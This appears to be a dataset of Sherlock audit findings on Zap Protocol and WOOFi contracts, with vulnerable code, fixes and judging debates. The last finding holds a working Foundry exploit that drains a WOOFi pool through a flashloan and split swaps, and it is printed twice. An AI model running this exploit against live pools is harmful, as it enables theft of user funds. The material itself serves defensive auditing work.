#149 .\nThe issues in this category should be Low.\nThe following submissions are somewhat vague, but did manage to identify the erroneous storage variable that leads to re-entrancy (s.index): #10 #53 #104 #138 #186 (and a few more).\nWhile they did not (or vaguely) described the ""attack path"", the attack path here is just ""directly calling `claim()` in your receive()"", so I suppose one can be ok with just spelling out the function and the wrong storage variable.\nSince submission quality is subjective, I am flagging these issues so the judges can help with reviewing dupes. Personally I think these submissions are still acceptable, but leaving to the judges to decide the where the bar is.\nsherlock-admin2\nEscalate\nPer Sherlock's duplication rule:\nIn the above example if the root issue A is one of the following generic vulnerabilities:\nReentrancy\nAccess control\nFront-running\nThen the submissions with valid attack paths and higher vulnerability are considered valid. If the submission is vague or does not identify the attack path with higher severity clearly it will be considered low.\nB is a valid issue\nC is low\nThe following submissions fail to and/or incorrectly identify the root cause that enables the attack path: #6 #34 #66 #68 #79 #90 #98 #132 #149 .\nThe issues in this category should be Low.\nThe following submissions are somewhat vague, but did manage to identify the erroneous storage variable that leads to re-entrancy (s.index): #10 #53 #104 #138 #186 (and a few more).\nWhile they did not (or vaguely) described the ""attack path"", the attack path here is just ""directly calling `claim()` in your receive()"", so I suppose one can be ok with just spelling out the function and the wrong storage variable.\nSince submission quality is subjective, I am flagging these issues so the judges can help with reviewing dupes. Personally I think these submissions are still acceptable, but leaving to the judges to decide the where the bar is.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nNilay27\nEscalate\nPer Sherlock's duplication rule:\nIn the above example if the root issue A is one of the following generic vulnerabilities:\nReentrancy\nAccess control\nFront-running\nThen the submissions with valid attack paths and higher vulnerability are considered valid. If the submission is vague or does not identify the attack path with higher severity clearly it will be considered low.\nB is a valid issue\nC is low\nThe following submissions fail to and/or incorrectly identify the root cause that enables the attack path: #6 #34 #66 #68 #79 #90 #98 #132 #134 #149 .\nThe issues in this category should be Low.\nThe following submissions are somewhat vague, but did manage to identify the erroneous storage variable that leads to re-entrancy (s.index): #10 #53 #104 #138 #186 (and a few more).\nWhile they did not (or vaguely) described the ""attack path"", the attack path here is just ""directly calling `claim()` in your receive()"", so I suppose one can be ok with just spelling out the function and the wrong storage variable.\nSince submission quality is subjective, I am flagging these issues so the judges can help with reviewing dupes. Personally I think these submissions are still acceptable, but leaving to the judges to decide the where the bar is.\n#134 identifies the issue of how the re-entrance occurs and suggests the same remediation. It clearly explains the following: ""The vulnerability arises from the contract's failure to update a user's claim state (s.index and s.amountClaimed) before transferring funds to the user, which allows a malicious contract to receive the funds and re-enter the claim function before the original call completes, potentially claiming more funds repeatedly.""\nThe recommendation suggests updating the state before or using a reentrancy guard.\nI am unsure why that has been included in the `low` category per your escalation?\nmidori-fuse\n@Nilay27 I suppose you are right. Sorry about that, there are just too many dupes here, I might have confused it with another issue that got lost somewhere.\nBut be assured that unless the head of judging downright disagrees with me, all dupes will be reviewed and judged accordingly. Once again I'm sorry for my mistake.\nnovaman33\nMy issue - #10 does show the root cause clearly and does suggest a thorough recommendation for the mitigation. I do not agree it is vague.\nkeesmark\nIt is the same as this one, but why is it considered invalid? #119\nnovaman33\nProbably because #119 says that reentrancy will occur when transferring erc20 tokens while call is used to transfer eth.\nZdravkoHr\nAlso, BNB is out of scope\nHash01011122\nAcknowledging that every mentioned issue accurately identifies both the root cause of the vulnerability and the correct attack paths, yet noting the straightforward nature of the issue as a reason for minimal effort in Watson's issue, suggests a potential oversight in the importance of comprehensive reporting.\nshubham-antier\nIssue resolved: Moved the updations above the transfers. Also, added a reentrancy guard to better the security.\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/Lithium-Ventures/zap-contracts-labs/pull/2.\nEvert0x\n@Hash01011122 what's your proposal on the exact family for this issue? Which reports should be excluded/included?\nHash01011122\n@Evert0x Had a indepth review of this family of issues: Issues which can be excluded are: #6, #10, #34, #66, #79, #90, #132, #138, #149. The pinpoint the root cause but fail to explain any attack vector.\narmormadeofwoe\n@Evert0x Had a indepth review of this family of issues: Issues which can be excluded are: #6, #10, #34, #66, #79, #90, #132, #138, #149. The pinpoint the root cause but fail to explain any attack vector.\nHi @Hash01011122, with all due respect, I believe #138 should remain valid since it showcases: root cause - sending funds before updating variables (breach of CEI pattern) attack path - the ability to trigger an arbitrary fallback function due to sending native ETH that could re-enter the same function and continue claiming funds due to the unchanged variables.\nI do agree that my report is a little short as this is arguably the most known and recognizable issue in this space, decided to spare the judges some extra reading.\nHash01011122\nImao #138 should be excluded as I mentioned above,\n0x3agle\n@Hash01011122 #6 accurately identifies the root cause and the attack path. Root cause:\nIf the token == address(1) (i.e. the native token) it performs an external call which sends the token to msg.sender and then updates the storage variable.\nAttack Path:\nThis allows an attacker to reenter the claim function until the contract is drained completely.\nHash01011122\n@0x3agle with all due respect your report doesn't mention any appropriate Attack Path.\n0x3agle\n@Hash01011122\nIssue: storage variable updated after external call Attack path: reentering the claim function Impact: Contract drained Mitigation: Follow CEI, add non-reentrant\nIsn't this enough for this issue to be considered a valid one?\nThis issue is so obvious I didn't feel the need for a PoC to convey my point.\nHaving said that, I respect your decision and will accept it.\nHash01011122\nHey, if we look from that lens even issues like #10, #34, #66, #132 and #138 should be valid too. I understand what you are pointing even I don't want to invalidate any of the issues as I understand watson's would not spend more effort on writing low hanging fruit issues, However, I'm just adhering to Sherlock's rulebook. Do you want to add anything here @0x3agle?\nEvert0x\n@Evert0x Had a indepth review of this family of issues: Issues which can be excluded are: #6, #10, #34, #66, #79, #90, #132, #138, #149. The pinpoint the root cause but fail to explain any attack vector.\nPlanning to accept escalation and move remove the reports mentioned by the Lead Judge as duplicates\n0x3agle\n@Hash01011122 @Evert0x You missed #53 and #104\nP.S. I'm not a fan of pulling down other reports but if a selected portion of reports are being disqualified because they didn't mention a ""detailed"" attack path for an obvious issue, then every report that did not include a detailed description/PoC should be considered for disqualification.\nnovaman33\n@Evert0x could you please identify how #10 fails to explain the attack vector. I believe the attack path is stated clearly and that the solution is also very detailed.\nHash01011122\nAgreed, @0x3agle we can add those issues in our list. Updated issues to get excluded will be: #6, #10, #34, #53, #66, #79, #90, #104, #132, #138, #149\nHash01011122\n@novaman33 I don't see any valid attack path mentioned in #10 report.\nEvert0x\nI believe #10 identified the attack pack and shows a good understanding of the issue.\nAfter taken a detailed look at all reports, I believe only the following ones should be excluded as all other reports pinpoint the exact logic in the code that allows the reentrancy to happen.\nhttps://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/6, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/34, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/66, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/79, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/90, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/132, https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/149\nEvert0x\nResult: High Has Duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nmidori-fuse: accepted"чCode Snippet\nTool used\nManual Review
Vesting contract cannot work with ETH, although it's supposed to.чmediumч"```\n    function claim() external {\n        address sender = msg.sender;\n\n        UserDetails storage s = userdetails[sender];\n        require(s.userDeposit != 0, ""No Deposit"");\n        require(s.index != vestingPoints.length, ""already claimed"");\n        uint256 pctAmount;\n        uint256 i = s.index;\n        for (i; i <= vestingPoints.length - 1; i++) {\n            if (block.timestamp >= vestingPoints[i][0]) {\n                pctAmount += (s.userDeposit * vestingPoints[i][1]) / 10000;\n            } else {\n                break;\n            }\n        }\n        if (pctAmount != 0) {\n            if (address(token) == address(1)) {\n                (bool sent, ) = payable(sender).call{value: pctAmount}("""");  // @audit - here\n                require(sent, ""Failed to send BNB to receiver"");\n            } else {\n                token.safeTransfer(sender, pctAmount);\n            }\n            s.index = uint128(i);\n            s.amountClaimed += pctAmount;\n        }\n    }\n```\n"ч"Vesting contract cannot work with native token, although it's supposed to.\nWithin the claim function, we can see that if `token` is set to address(1), the contract should operate with ETH\n```\n    function claim() external {\n        address sender = msg.sender;\n\n        UserDetails storage s = userdetails[sender];\n        require(s.userDeposit != 0, ""No Deposit"");\n        require(s.index != vestingPoints.length, ""already claimed"");\n        uint256 pctAmount;\n        uint256 i = s.index;\n        for (i; i <= vestingPoints.length - 1; i++) {\n            if (block.timestamp >= vestingPoints[i][0]) {\n                pctAmount += (s.userDeposit * vestingPoints[i][1]) / 10000;\n            } else {\n                break;\n            }\n        }\n        if (pctAmount != 0) {\n            if (address(token) == address(1)) {\n                (bool sent, ) = payable(sender).call{value: pctAmount}("""");  // @audit - here\n                require(sent, ""Failed to send BNB to receiver"");\n            } else {\n                token.safeTransfer(sender, pctAmount);\n            }\n            s.index = uint128(i);\n            s.amountClaimed += pctAmount;\n        }\n    }\n```\n\nHowever, it is actually impossible for the contract to operate with ETH, since `updateUserDeposit` always attempts to do a token transfer.\n```\n    function updateUserDeposit(\n        address[] memory _users,\n        uint256[] memory _amount\n    ) public onlyRole(DEFAULT_ADMIN_ROLE) {\n        require(_users.length <= 250, ""array length should be less than 250"");\n        require(_users.length == _amount.length, ""array length should match"");\n        uint256 amount;\n        for (uint256 i = 0; i < _users.length; i++) {\n            userdetails[_users[i]].userDeposit = _amount[i];\n            amount += _amount[i];\n        }\n        token.safeTransferFrom(distributionWallet, address(this), amount); // @audit - this will revert\n    }\n```\n\nSince when the contract is supposed to work with ETH, token is set to address(1), calling `safeTransferFrom` on that address will always revert, thus making it impossible to call this function."чmake the following check\n```\n        if (address(token) != address(1)) token.safeTransferFrom(distributionWallet, address(this), amount);\n```\n\nDiscussion\nshubham-antier\nRemoved ETH functionality from the contract.\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/Lithium-Ventures/zap-contracts-labs/pull/5.чVesting contract is unusable with ETH\nCode Snippet\nTool used\nManual Review
Blocklisted investors can still claim USDC in `TokenSale.sol`чmediumч```\n    /**\n     @dev Whitelist users\n     @param _address Address of User\n     */\n    function setClaimBlock(address _address) external onlyRole(OPERATOR) {\n        blockClaim[_address] = true;\n    }\n```\nч"A wrong argument is passed when checking if a user is blacklisted for claiming in `TokenSale.claim()`. Because the check is insufficient, blocked users can claim their USDC.\n`Admin.setClaimBlock()` blocks users from claiming. The function accepts the address of the user to be blocked and adds it to the `blockClaim` mapping.\n```\n    /**\n     @dev Whitelist users\n     @param _address Address of User\n     */\n    function setClaimBlock(address _address) external onlyRole(OPERATOR) {\n        blockClaim[_address] = true;\n    }\n```\n\nThe check in `Admin.claim()` wrongly passes `address(this)` as argument when calling `Admin.blockClaim`.\n```\n        require(\n            uint8(epoch) > 1 && !admin.blockClaim(address(this)),\n            ""TokenSale: Not time or not allowed""\n        );\n```\n\nIn this context, `address(this)` will be the address of the token sale contract and the require statement can be bypassed even by a blocked user."ч"Pass the address of the user.\n```\n        require(\n// Remove the line below\n            uint8(epoch) > 1 && !admin.blockClaim(address(this)),\n// Add the line below\n            uint8(epoch) > 1 && !admin.blockClaim(msg.sender)),\n            ""TokenSale: Not time or not allowed""\n        );\n```\n\nDiscussion\n0502lian\nBlockClaim function is used for instance(block the whole tokeSale ), not for one user.\nCoareal\nEscalate\nIssue is invalid. Implementation is correct and intended. The mentioned check is used to block a specific tokenSale instance, and not that of a user.\nsherlock-admin2\nEscalate\nIssue is invalid. Implementation is correct and intended. The mentioned check is used to block a specific tokenSale instance, and not that of a user.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\ns1ce\nIssue should be valid. Comments in the code seem to suggest that this is on a per user basis.\nZdravkoHr\nAgree with @s1ce. According to the Sherlock hierarchy of truth `protocol documentation (including code comments) > protocol answers on the contest public Discord channel.`\nomar-ahsan\nIssue should be invalid, the only issue here is that the comments are wrong.\nHash01011122\nCan you give any reason on why this issue should be invalidated?? @Coareal @omar-ahsan\nomar-ahsan\n@Hash01011122\n```\n    /**\n     @dev Whitelist users\n     @param _address Address of User\n     */\n    function setClaimBlock(address _address) external onlyRole(OPERATOR) {\n        blockClaim[_address] = true;\n    }\n```\n\nThe comments above the function indicate whitelisting of users but this function is not intended to whitelist any address. `setClaimBlock()` as the name suggests is used to block an address by setting it to true in `blockClaim`. Similarly\n\nThe comments by sponsor team indicate that this function is used to block all incoming claims for a particular Token Sale which means all users can not claim from the token sale during the blocked duration. Currently the function does as intended according to this description.\nFurther more the code already contains a function to blacklist users i.e addToBlackList(). This function performs the blocking of single users by blocking the deposit() function for blacklisted users which is the entry point to the token sale.\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/Lithium-Ventures/zap-contracts-labs/pull/3.\nHash01011122\nGlad @omar-ahsan you did point out this mistake. My question to you is were watsons aware of this at the time of contest if not this is a valid finding.\nomar-ahsan\nGlad @omar-ahsan you did point out this mistake. My question to you is were watsons aware of this at the time of contest if not this is a valid finding.\nSince the comments are misleading and not correct, the next source of information was the dev in the public chat. The screenshot of the message in my previous reply is from the public chat hence everyone knew this information.\nEvert0x\nPlanning to accept escalation and invalidate issue\nZdravkoHr\n@Evert0x, so the Sherlock documentation should be updated to discord > comments?\nHash01011122\n@Evert0x I think this is a valid issue, as Watson's were not aware of it before or at the time of the contest. @omar-ahsan I understand that you had conversation with sponsors and they responded you in discord but not every watson was aware of it. I would like @Evert0x to reconsider his decision.\nEvert0x\n@Hash01011122 do you know if there was any other language for this function in the code or docs?\nHash01011122\nAs far as I know there were no mentions about this in docs or in codebase\ndetectiveking123\n@Evert0x @Czar102\nThere are a lot, and I mean a lot, of issues with the documentation in this codebase. This has left a lot of ambiguity in terms of what the sponsors actually want vs the design decisions they've consciously made.\nI would recommend only rewarding issues that actually cause a loss of funds or very, very clearly break protocol functionality (i.e. it's just definitely not a design decision). This issue, as well as #87 and #56, fall into the category of ""maybe the sponsors intended this, maybe they didn't"", and I don't think any of them should be valid issues.\nNilay27\n@Evert0x @Czar102\nThere are a lot, and I mean a lot, of issues with the documentation in this codebase. This has left a lot of ambiguity in terms of what the sponsors actually want vs the design decisions they've consciously made.\nI would recommend only rewarding issues that actually cause a loss of funds or very, very clearly break protocol functionality (i.e. it's just definitely not a design decision). This issue, as well as #87 and #56, fall into the category of ""maybe the sponsors intended this, maybe they didn't"", and I don't think any of them should be valid issues.\n@detectiveking123, I understand your concerns about potentially overreporting issues that may be interpreted as design decisions rather than genuine flaws.\nHowever, as a Watson, we rely heavily on the documentation provided to guide our auditing process. When the documentation is unclear and the sponsors are not available for clarification, we must address potential vulnerabilities based on our best understanding of the intended functionality.\nConsidering the nature of a competitive audit, dismissing ambiguities that arise from unclear documentation could inadvertently overlook genuine issues and waste a lot of Watsons' time due to a lack of due diligence before the audit.\n@Evert0x @Czar102 @Hash01011122, I would like to request that we only finalize these issues once after the sponsors' confirmation. While this might be a bit of a hassle, but this would be the fairest approach.\nHash01011122\nI stand by what I mentioned earlier that this should remain a valid issue. @Evert0x @Czar102\nEvert0x\nWith the hierarchy of truth at the time of the contest I believe the right judgment is to reject the escalation and keep the issue valid.\ndetectiveking123\n@Evert0x Judgement doesn't make sense. By that logic, there are so many other issues in this contest that should be valid, just because the documentation is completely wrong.\nHash01011122\n@detectiveking123 I've already justified the validity of this issue above. If you can provide a counterargument using any rule from Sherlock's documentation, please do so. If not please refrain to comment on this issue.\nEvert0x\nResult: Medium Has Duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nCoareal: rejected"ч"The whole functionality for blocking claims doesn't work properly.\nCode Snippet\n```\n    function claim() external {\n        checkingEpoch();\n        require(\n            uint8(epoch) > 1 && !admin.blockClaim(address(this)),\n            ""TokenSale: Not time or not allowed""\n        );\n\n        Staked storage s = stakes[msg.sender];\n        require(s.amount != 0, ""TokenSale: No Deposit"");\n        require(!s.claimed, ""TokenSale: Already Claimed"");\n\n        uint256 left;\n        (s.share, left) = _claim(s);\n        require(left > 0, ""TokenSale: Nothing to claim"");\n        uint256 refundTaxAmount;\n        if (s.taxAmount > 0) {\n            uint256 tax = userTaxRate(s.amount, msg.sender);\n            uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE;\n            if (taxFreeAllc >= s.share) {\n                refundTaxAmount = s.taxAmount;\n            } else {\n                refundTaxAmount = (left * tax) / POINT_BASE;\n            }\n            usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount);\n        }\n        s.claimed = true;\n        usdc.safeTransfer(msg.sender, left);\n        emit Claim(msg.sender, left);\n    }\n```\n\nTool used\nManual Review"
Max allocations can be bypassed with multiple addresses because of guaranteed allocationsчmediumч```\n        if (userTier == 0 && giftedTierAllc == 0) {\n            return 0;\n        }\n```\nч`TokenSale._processPrivate()` ensures that a user cannot deposit more than their allocation amount. However, each address can deposit up to at least `maxAllocations`. This can be leveraged by a malicious user by using different addresses to claim all tokens without even staking.\nThe idea of the protocol is to give everyone the right to have at least `maxAlocations` allocations. By completing missions, users level up and unlock new tiers. This process will be increasing their allocations. The problem is that when a user has no allocations, they have still a granted amount of `maxAllocations`.\n`TokenSale.calculateMaxAllocation` returns $max(maxTierAlloc(), maxAllocation)$\nFor a user with no allocations, `_maxTierAlloc()` will return 0. The final result will be that this user have `maxAllocation` allocations (because `maxAllocation` > 0).\n```\n        if (userTier == 0 && giftedTierAllc == 0) {\n            return 0;\n        }\n```\n\nMultiple Ethereum accounts can be used by the same party to take control over the IDO and all its allocations, on top of that without even staking.\nNOTE: setting `maxAllocation = 0` is not a solution in this case because the protocol wants to still give some allocations to their users.чA possible solution may be to modify `calculateMaxAllocation` in the following way:\n```\n    function calculateMaxAllocation(address _sender) public returns (uint256) {\n        uint256 userMaxAllc = _maxTierAllc(_sender);\n// Add the line below\n       if (userMaxAllc == 0) return 0;\n\n         if (userMaxAllc > maxAllocation) {\n            return userMaxAllc;\n        } else {\n            return maxAllocation;\n        }\n    }\n```\n\nDiscussion\nZdravkoHr\nEscalate\n@Hash01011122, why was this issue excluded? It shows how users can bypass a core restriction and on top of that - doing it without staking.\nsherlock-admin2\nEscalate\n@Hash01011122, why was this issue excluded? It shows how users can bypass a core restriction and on top of that - doing it without staking.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nHash01011122\nThe function is operating as designed. If you believe the issue warrants further investigation, please submit a Proof of Concept (PoC).\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/Lithium-Ventures/zap-contracts-labs/pull/1.\nZdravkoHr\n@Hash01011122 basically everyone, regardless of the staked amount, can deposit up to maxAllocations\nHash01011122\nIf you don't provide a valid PoC for this issue within 48 hours, I will consider this as invalid\nZdravkoHr\n@Hash01011122, here is my PoC. You have to do two things before running it:\n```\ncontract MockStaking {\n    function getUserState(address) public returns(uint256, uint256, uint256, uint256) {\n        return (0, 0, 0, 0);\n    }\n}\n```\n\n```\n    function setUsdc(address _new) public {\n        usdc = IERC20D(_new);\n    }\n```\n\ns1ce\n@Evert0x @Hash01011122\nI am not sure if this issue is valid which is why I didn't escalate my own, but mine (#196) is a duplicate of this\nMy issue #172 that has been a marked a dup of this one is actually a dup of #158 instead\nEvert0x\n@Hash01011122 what's your opinion about the poc?\nHash01011122\nZdravkoHr\nThe 0 will be used in calculateMaxAllocation and maxAllocations will be returned. Which part of the PoC is not working?\nHash01011122\nThe `deposit` function in your PoC isn't working, if you still feel it's valid can you please provide the exact lines of code which justifies the logic you are trying to portray with proper mitigation for it.\nZdravkoHr\nHave you added the MockStaking contract and the setUsdc function?\ndetectiveking123\n@Evert0x I believe this one and it's duplicates are actually the same issue family as #158 (they point out the same root cause issue)\n`1. Private round. Only ion token holders can participate in this round.`\n`A single investor can purchase up to their maximum allowed investment defined by the tier.`\nClearly, based on this documentation (which I strongly believe is incorrect and should not be used as a source of truth, but my personal opinions are besides the point), both issues should be valid.\nHash01011122\n@ZdravkoHr I've added the setUsdc function and MockStaking contract, and also deleted the entire file and environment. I reinstalled everything from scratch to rerun your PoC, but the results remain unchanged.\nHash01011122\n@detectiveking123 Still verifying this issue's validity, whereas for issue #158, I will take confirmation from sponsors.\ndetectiveking123\n@Hash01011122 They are the exact same root cause though, so they should be valid and duplicates of each other. What the sponsors say shouldn't matter; I've shown you excerpts from the documentation that prove validity.\nEvert0x\nAgree with @detectiveking123\nFor that reason I will reject the escalation and invalidate the issue\ndetectiveking123\n@Evert0x I'm saying the issue should be valid. They're all valid issues, and duplicates of each other, because of the above excerpts from the documentation.\nEvert0x\nThe language you quoted supports the invalidation of this issue.\nA single investor can purchase up to their maximum allowed investment defined by the tier.\nIndicating it's a maximum allowed investment personalized to the investor.\nBesides that, they have clarified it in a discord message https://github.com/sherlock-audit/2024-03-zap-protocol-judging/issues/158#issuecomment-2047444809\nI will reject the escalation and invalidate the issue\nZdravkoHr\n@Evert0x, this issue shows how tokens can be obtained without any prior staking. I think the root cause here is the missing if statement from my recommendation\ndetectiveking123\n@Evert0x You misunderstand. The tier based max allocation is defined by `_maxTierAllc`. The current code would allow them to purchase potentially more than that if maxAllocation is higher.\nFurthermore, the language here is pretty clear:\n`1. Private round. Only ion token holders can participate in this round.`\nClearly, this code allows non-ion token holders/stakers to participate.\ndetectiveking123\nAlso, to clarify my point, I am suggesting that it is not just this issue that is valid based on the documentation, but also the entire #158 family (they have the exact same root cause). This issue is a strict subset of #158 , although still valid.\nMy recommendation is to duplicate the two issue families and validate all of them.\nEvert0x\nThank you for correcting me @detectiveking123. I indeed misunderstood this issue.\nStill looking into the outcome for this issue. But I don't believe this is a duplicate of #158.\ndetectiveking123\n@Evert0x This is actually a strict subset of #158 .\nBoth issues reference the exact code snippet and lead to the exact same impact, but have different opinions about what the correct fix is. In #158 , the fix that is suggested is to replace the max with a min, while in this issue adding an extra if statement is suggested.\nIn fact, #158 even states that: `However, swapped return values allow a user to have 0 allocations and get themaxAllocation or to exceed the maximum allocations`\nClearly all Watsons have identified the core issue but have different suggestions / opinions on how to fix it\nEvert0x\nI believe the following issues are a family #152, #158, #161, #172.\nThey all describe the following issue\nget maximum allocation while having 0\nPlanning to make #152 the main report issue as the fix recommendation is correct\nThanks @detectiveking123\ndetectiveking123\n@Evert0x No problem. Your proposed judgement makes sense to me.\nHash01011122\nThanks for bring this to light @detectiveking123, I agree that this should be considered a valid issue with dups #019, #158, #161, #172.\nEvert0x\nResult: Medium Has Duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nZdravkoHr: acceptedчBuying all allocations without staking. This also violates a key property that only ION holders can deposit.\nCode Snippet\n```\n    function calculateMaxAllocation(address _sender) public returns (uint256) {\n        uint256 userMaxAllc = _maxTierAllc(_sender);\n\n        if (userMaxAllc > maxAllocation) {\n            return userMaxAllc;\n        } else {\n            return maxAllocation;\n        }\n    }\n```\n\nTool used\nManual Review
Pool can be drainedчhighч"```\nfunction test_Exploit() public {\n        // Flashloan 99989999999999999990000 (99_990) WOO\n        // Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go\n        // Sell 20 USDC and get 199779801821639475527975 (199_779) WOO\n        // Repay flashloan, pocket the rest of the 100K WOO. \n\n        // Reference values: \n        // s = 0.1, p = 1, c = 0.0001 \n\n        // bootstrap the pool \n        uint usdcAmount = 100_0000_0_0000000000000_000;\n        deal(USDC, ADMIN, usdcAmount);\n        deal(WOO, ADMIN, usdcAmount);\n        deal(WETH, ADMIN, usdcAmount);\n        vm.startPrank(ADMIN);\n        IERC20(USDC).approve(address(pool), type(uint256).max);\n        IERC20(WOO).approve(address(pool), type(uint256).max);\n        IERC20(WETH).approve(address(pool), type(uint256).max);\n        pool.depositAll(USDC);\n        pool.depositAll(WOO);\n        pool.depositAll(WETH);\n        vm.stopPrank();\n        ////////////////////////\n\n        // fund mr TAPIR\n        vm.startPrank(TAPIR);\n        uint wooAmountForTapir = 9999 * 1e18 - 1000;\n        deal(WOO, TAPIR, wooAmountForTapir * 10);\n        IERC20(USDC).approve(address(router), type(uint256).max);\n        IERC20(WOO).approve(address(router), type(uint256).max);\n        IERC20(WETH).approve(address(router), type(uint256).max);\n        vm.stopPrank();\n        ////////////////////////\n        \n        // get the price before the swaps\n        (uint128 price, ) = oracle.woPrice(WOO);\n        console.log(""Price before the swap"", price);\n\n        // here, we assume maxGamma and maxNotionalSwap can save us. However, due to how AMM behaves\n        // partial swaps in same tx will also work and it will be even more profitable! \n        uint cumulative;\n        for (uint i; i < 10; ++i) {\n            vm.prank(TAPIR);\n            cumulative += router.swap(WOO, USDC, wooAmountForTapir, 0, payable(TAPIR), TAPIR);\n        }\n\n        // how much we bought and what's the final swap? \n        console.log(""USDC bought after swaps"", cumulative);\n        (price, ) = oracle.woPrice(WOO);\n        console.log(""Price after swap"", price);\n\n        // sell 20 USDC, how much WOO we get? (199779801821639475527975)\n        vm.prank(TAPIR);\n        uint receivedWOO = router.swap(USDC, WOO, 20 * 1e6, 0, payable(TAPIR), TAPIR);\n        console.log(""Received WOO"", receivedWOO); // 199779801821639475527975 (10x)\n        console.log(""Total WOO flashloaned"", wooAmountForTapir * 10); // 99989999999999999990000\n\n        // attack is succesfull \n        assertGe(receivedWOO, wooAmountForTapir * 10);\n    }\n```\n"ч"The pool can be drained just as it was during the incident that occurred previously.\n`maxNotionalSwap` and `maxGamma` and the new math formula do not prevent the pool being drainable. Same attack vector that happent previously is still applicable: https://woo.org/blog/en/woofi-spmm-exploit-post-mortem https://rekt.news/woo-rekt/\nFlashloan 99989999999999999990000 (99_990) WOO Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go Sell 20 USDC and get 199779801821639475527975 (199_779) WOO Repay flashloan, pocket the rest of the 100K WOO.\nCoded PoC:\n```\nfunction test_Exploit() public {\n        // Flashloan 99989999999999999990000 (99_990) WOO\n        // Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go\n        // Sell 20 USDC and get 199779801821639475527975 (199_779) WOO\n        // Repay flashloan, pocket the rest of the 100K WOO. \n\n        // Reference values: \n        // s = 0.1, p = 1, c = 0.0001 \n\n        // bootstrap the pool \n        uint usdcAmount = 100_0000_0_0000000000000_000;\n        deal(USDC, ADMIN, usdcAmount);\n        deal(WOO, ADMIN, usdcAmount);\n        deal(WETH, ADMIN, usdcAmount);\n        vm.startPrank(ADMIN);\n        IERC20(USDC).approve(address(pool), type(uint256).max);\n        IERC20(WOO).approve(address(pool), type(uint256).max);\n        IERC20(WETH).approve(address(pool), type(uint256).max);\n        pool.depositAll(USDC);\n        pool.depositAll(WOO);\n        pool.depositAll(WETH);\n        vm.stopPrank();\n        ////////////////////////\n\n        // fund mr TAPIR\n        vm.startPrank(TAPIR);\n        uint wooAmountForTapir = 9999 * 1e18 - 1000;\n        deal(WOO, TAPIR, wooAmountForTapir * 10);\n        IERC20(USDC).approve(address(router), type(uint256).max);\n        IERC20(WOO).approve(address(router), type(uint256).max);\n        IERC20(WETH).approve(address(router), type(uint256).max);\n        vm.stopPrank();\n        ////////////////////////\n        \n        // get the price before the swaps\n        (uint128 price, ) = oracle.woPrice(WOO);\n        console.log(""Price before the swap"", price);\n\n        // here, we assume maxGamma and maxNotionalSwap can save us. However, due to how AMM behaves\n        // partial swaps in same tx will also work and it will be even more profitable! \n        uint cumulative;\n        for (uint i; i < 10; ++i) {\n            vm.prank(TAPIR);\n            cumulative += router.swap(WOO, USDC, wooAmountForTapir, 0, payable(TAPIR), TAPIR);\n        }\n\n        // how much we bought and what's the final swap? \n        console.log(""USDC bought after swaps"", cumulative);\n        (price, ) = oracle.woPrice(WOO);\n        console.log(""Price after swap"", price);\n\n        // sell 20 USDC, how much WOO we get? (199779801821639475527975)\n        vm.prank(TAPIR);\n        uint receivedWOO = router.swap(USDC, WOO, 20 * 1e6, 0, payable(TAPIR), TAPIR);\n        console.log(""Received WOO"", receivedWOO); // 199779801821639475527975 (10x)\n        console.log(""Total WOO flashloaned"", wooAmountForTapir * 10); // 99989999999999999990000\n\n        // attack is succesfull \n        assertGe(receivedWOO, wooAmountForTapir * 10);\n    }\n```\n"ч"Discussion\nfb-alexcq\nThis extreme price-deviation case has already been handled by price check (against Chainlink) in our Wooracle's price function.\nmstpr\n@fb-alexcq correct, but some tokens like WOO does not have chainlink price feeds in other networks, in that case the attack is feasible\nfb-alexcq\nThanks for the feedback.\nWe already decided to never support any token which are unavailable in Chainlink, right after we got exploited a month ago. And this is the only way to fix it; otherwise, the project cannot run again.\nWangSecurity\nThe info about not using tokens that don't have Chainlink price feeds is not in README. Moreover, the README says any standard token. Therefore, aproppriate severity is High.\nWangSecurity\nI've consulted on this issue with the Head of Judging and decided to invalidate it, since such tokens wouln't be used. The README says ""any"" ERC20 token, therefore, it's expected tokens without the any weird traits will be used.\nmstpr\nEscalate\nEvery ERC20 can be used, tokens that does not have a a chainlink price feed set is not considered as ""weird"" tokens as per Sherlock: https://github.com/d-xo/weird-erc20\nAdditionally, the README does not states that tokens that have no chainlink oracle will not be used. Though, this would be contradictory anyways since the current code has an extra logic to handle tokens without the chainlink price feed.\nAlso, the deployed chains are as follows in README: Arbitrum, Optimism, Base, Avalanche, BSC, Polygon PoS, Mantle, Fantom, Polygon zkEVM, zkSync, Linea There are lots of tokens that does not have chainlink price feed and have very high liquidity on some of them. For example, the WOO token has no price feeds, SOL token doesn't have price feed in Linea, zkSyncEVM, MATIC token doesn't have price feed in Linea, Scroll, Base etc.\nConsidering how serious the issue is and the above, this issue should be definitely considered as a high issue.\nsherlock-admin2\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou 